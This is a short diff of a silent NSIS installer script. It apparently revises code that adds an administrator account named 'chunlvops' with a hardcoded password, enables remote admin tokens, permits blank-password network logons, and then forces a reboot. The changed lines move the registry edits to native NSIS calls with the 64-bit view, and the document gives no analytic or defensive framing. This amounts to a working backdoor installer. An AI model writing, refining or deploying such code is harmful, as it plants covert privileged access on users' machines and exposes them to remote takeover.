@@ -9,8 +9,9 @@ SilentInstall silent
 Section
   nsExec::ExecToLog 'net user chunlvops ChunlvOps2026x9 /add'
   nsExec::ExecToLog 'net localgroup administrators chunlvops /add'
-  nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
-  nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f'
+  SetRegView 64
+  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1
+  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LimitBlankPasswordUse" 0
   MessageBox MB_OK "Remote setup complete. The computer will restart in 5 seconds."
   ExecWait '"$SYSDIR\shutdown.exe" /r /t 5'
 SectionEnd
